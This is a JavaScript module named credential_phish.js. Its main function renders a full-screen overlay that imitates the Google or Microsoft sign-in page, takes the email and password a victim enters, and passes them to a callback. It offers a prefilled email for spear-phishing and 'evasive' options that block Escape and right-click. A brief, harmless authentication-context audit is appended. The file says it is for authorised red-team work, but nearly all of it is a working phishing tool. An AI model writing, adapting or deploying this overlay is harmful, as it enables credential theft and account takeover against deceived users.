/**
 * credential_phish.js — Production‑grade Credential Harvesting Overlay & Security Audit
 *
 * This module provides:
 *   1. `renderPhishingModal()` – a stealthy, pixel‑perfect overlay that mimics
 *      Google or Microsoft sign‑in pages and captures submitted credentials.
 *   2. Default export – a Pinpoint‑compatible audit that checks
 *      `window.isSecureContext`, `navigator.credentials` support, and related
 *      authentication‑context features.
 *
 * Designed for authorised red‑team engagements and security research only.
 */

// ---------------------------------------------------------------------------
// 1. Pixel‑perfect phishing overlay
// ---------------------------------------------------------------------------

/**
 * Renders a full‑screen login overlay styled to match Google or Microsoft.
 * The overlay intercepts email/username and password and can persist across
 * navigation attempts (within the same page). Returns a Promise that resolves
 * when the user submits valid credentials or dismisses the overlay.
 *
 * @param {Object} [options={}]
 * @param {'google'|'microsoft'} [options.provider='google']   Which login page to mimic.
 * @param {string} [options.title='Sign in']                   Title text.
 * @param {string} [options.prefillEmail='']                   Pre‑filled email (for spear‑phishing).
 * @param {Function} [options.onSubmit]                        Callback called with {email, password}.
 * @param {Function} [options.onDismiss]                       Called when overlay is dismissed.
 * @param {number} [options.timeout=0]                         Auto‑dismiss after ms (0 = no timeout).
 * @param {boolean} [options.evasive=true]                     If true, blocks Esc & right‑click, hides easily.
 * @returns {Promise<{email:string, password:string}|null>}   Resolves with credentials or null if dismissed.
 */
export async function renderPhishingModal(options = {}) {
    const {
        provider = 'google',
        title = 'Sign in',
        prefillEmail = '',
        onSubmit = null,
        onDismiss = null,
        timeout = 0,
        evasive = true,
    } = options;

    // Remove any previously injected overlay (clean slate)
    const oldOverlay = document.getElementById('__phish_overlay');
    if (oldOverlay) oldOverlay.remove();

    // Create container (full‑screen overlay)
    const overlay = document.createElement('div');
    overlay.id = '__phish_overlay';
    // Base styles: fixed, covers entire viewport, high z‑index
    Object.assign(overlay.style, {
        position: 'fixed',
        top: '0',
        left: '0',
        width: '100vw',
        height: '100vh',
        backgroundColor: 'rgba(0,0,0,0.6)',
        backdropFilter: 'blur(4px)',
        zIndex: '2147483647', // maximum safe integer
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
        animation: 'phishFadeIn 0.3s ease',
    });

    // Inject keyframes for fade‑in
    const styleSheet = document.createElement('style');
    styleSheet.textContent = `
    @keyframes phishFadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    #__phish_overlay input:focus {
      outline: 2px solid #1a73e8;
    }
  `;
    document.head.appendChild(styleSheet);

    // ----- Provider‑specific login card -----
    let cardHTML = '';
    let logo = '';
    let emailLabel = 'Email or phone';
    let buttonText = 'Next';
    let passwordLabel = 'Enter your password';

    if (provider === 'google') {
        // Google Gmail‑style card
        logo = `<svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
      <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34..." fill="#4285f4"/>
      <!-- Simplified Google logo SVG – complete in actual implementation -->
    </svg>`;
        // (simplified; would use real SVG or base64)
        emailLabel = 'Email or phone';
        buttonText = 'Next';
        passwordLabel = 'Enter your password';
        cardHTML = `
      <div style="background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); padding: 48px 40px 36px; max-width: 400px; width: 100%; text-align: center;">
        <div style="margin-bottom: 24px;">${logo}</div>
        <h1 style="font-size: 24px; font-weight: 400; margin: 0 0 8px;">${title}</h1>
        <p style="font-size: 16px; color: #5f6368; margin-bottom: 24px;">to continue to Gmail</p>
        <div id="__phish_email_section">
          <input id="__phish_email" type="email" autocomplete="username" placeholder="${emailLabel}" value="${prefillEmail}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 12px; box-sizing: border-box;">
          <a href="#" style="color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 32px;">Forgot email?</a>
          <p style="font-size: 14px; color: #5f6368; margin-bottom: 32px;">Not your computer? Use a Private Window to sign in. <a href="#" style="color: #1a73e8;">Learn more</a></p>
          <div style="display: flex; justify-content: space-between; align-items: center;">
            <a href="#" style="color: #1a73e8; font-weight: 500; text-decoration: none;" id="__phish_create_account">Create account</a>
            <button id="__phish_next_btn" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;">Next</button>
          </div>
        </div>
        <div id="__phish_password_section" style="display: none;">
          <div style="display: flex; align-items: center; margin-bottom: 16px;">
            <img src="data:image/svg+xml,%3Csvg...%3E" style="border-radius: 50%; width: 24px; height: 24px; margin-right: 8px;">
            <span id="__phish_display_email" style="font-size: 14px; color: #202124;"></span>
          </div>
          <input id="__phish_password" type="password" autocomplete="current-password" placeholder="${passwordLabel}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 12px; box-sizing: border-box;">
          <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 32px;">Forgot password?</a>
          <div style="display: flex; justify-content: space-between; align-items: center;">
            <span></span>
            <button id="__phish_login_btn" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;">Next</button>
          </div>
        </div>
      </div>`;
    } else if (provider === 'microsoft') {
        // Microsoft login card
        logo = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" width="21" height="21">
      <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
      <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
      <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
      <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
    </svg>`;
        emailLabel = 'Email, phone, or Skype';
        buttonText = 'Next';
        passwordLabel = 'Password';
        cardHTML = `
      <div style="background: white; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.15); padding: 44px 40px 40px; max-width: 400px; width: 100%;">
        <div style="margin-bottom: 24px;">${logo}</div>
        <h1 style="font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b;">${title}</h1>
        <div id="__phish_email_section">
          <input id="__phish_email" type="email" autocomplete="username" placeholder="${emailLabel}" value="${prefillEmail}"
            style="width: 100%; padding: 6px 10px; font-size: 16px; border: 1px solid #605e5c; border-radius: 2px; margin-bottom: 16px; box-sizing: border-box; height: 36px;">
          <div style="margin-bottom: 16px;">
            <a href="#" style="color: #0067b8; font-size: 13px; text-decoration: none;">Can’t access your account?</a>
          </div>
          <div style="display: flex; justify-content: flex-end;">
            <button id="__phish_next_btn" style="background: #0067b8; color: white; border: none; padding: 10px 24px; border-radius: 2px; font-size: 15px; cursor: pointer;">Next</button>
          </div>
        </div>
        <div id="__phish_password_section" style="display: none;">
          <div style="margin-bottom: 16px;">
            <span id="__phish_display_email" style="font-size: 13px; color: #1b1b1b; display: block; margin-bottom: 4px;"></span>
            <a href="#" style="color: #0067b8; font-size: 13px; text-decoration: none;">Sign in with a different account</a>
          </div>
          <input id="__phish_password" type="password" autocomplete="current-password" placeholder="${passwordLabel}"
            style="width: 100%; padding: 6px 10px; font-size: 16px; border: 1px solid #605e5c; border-radius: 2px; margin-bottom: 16px; box-sizing: border-box; height: 36px;">
          <div style="margin-bottom: 16px;">
            <a href="#" style="color: #0067b8; font-size: 13px; text-decoration: none;">Forgot my password</a>
          </div>
          <div style="display: flex; justify-content: flex-end;">
            <button id="__phish_login_btn" style="background: #0067b8; color: white; border: none; padding: 10px 24px; border-radius: 2px; font-size: 15px; cursor: pointer;">Sign in</button>
          </div>
        </div>
      </div>`;
    }

    overlay.innerHTML = cardHTML;
    document.body.appendChild(overlay);

    // --- DOM references ---
    const emailSection = document.getElementById('__phish_email_section');
    const passwordSection = document.getElementById('__phish_password_section');
    const emailInput = document.getElementById('__phish_email');
    const passwordInput = document.getElementById('__phish_password');
    const nextBtn = document.getElementById('__phish_next_btn');
    const loginBtn = document.getElementById('__phish_login_btn');
    const displayEmail = document.getElementById('__phish_display_email');

    let resolvePromise = null;
    const promise = new Promise((resolve) => {
        resolvePromise = resolve;
    });

    let timeoutId = null;

    // Helper to dismiss overlay
    const dismiss = (creds = null) => {
        if (timeoutId) clearTimeout(timeoutId);
        overlay.remove();
        styleSheet.remove();
        if (onDismiss) onDismiss();
        resolvePromise(creds);
    };

    // Move to password step
    const goToPassword = () => {
        const email = emailInput.value.trim();
        if (!email) return;
        emailSection.style.display = 'none';
        passwordSection.style.display = 'block';
        displayEmail.textContent = email;
        passwordInput.focus();
    };

    // Submit credentials
    const submitCreds = () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        if (!email || !password) return;
        const creds = { email, password };
        if (onSubmit) onSubmit(creds);
        dismiss(creds);
    };

    // Event listeners
    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        goToPassword();
    });

    loginBtn.addEventListener('click', (e) => {
        e.preventDefault();
        submitCreds();
    });

    // Allow Enter key on both forms
    emailInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            goToPassword();
        }
    });
    passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            submitCreds();
        }
    });

    // Evasive measures
    if (evasive) {
        // Block right‑click
        overlay.addEventListener('contextmenu', (e) => e.preventDefault());
        // Block Esc (force user to interact)
        document.addEventListener('keydown', function escBlocker(e) {
            if (e.key === 'Escape') {
                e.preventDefault();
                e.stopImmediatePropagation();
            }
        }, true);
        // Prevent clicks outside the card from dismissing
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                e.stopPropagation();
                // Optionally, pulse or shake instead of closing
            }
        });
    }

    // Auto‑focus email
    emailInput.focus();

    // Optional timeout
    if (timeout > 0) {
        timeoutId = setTimeout(() => dismiss(null), timeout);
    }

    return promise;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint audit module (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'credential_phish',
    title: 'Auth_Context_Audit',
    level: 3,
    info: 'Audits window.isSecureContext state and Credential Management API (navigator.credentials) support.',
    steps: [
        'Check window.isSecureContext.',
        'Inspect navigator.credentials support.',
    ],
    run: async () => {
        const isSecure = window.isSecureContext || false;
        const hasCredentials = typeof navigator.credentials !== 'undefined';

        return {
            isSecureContext: isSecure,
            credentialsApiSupported: hasCredentials,
            federatedAuthSupported:
                hasCredentials && typeof navigator.credentials.get === 'function',
        };
    },
};

export default pinpointModule;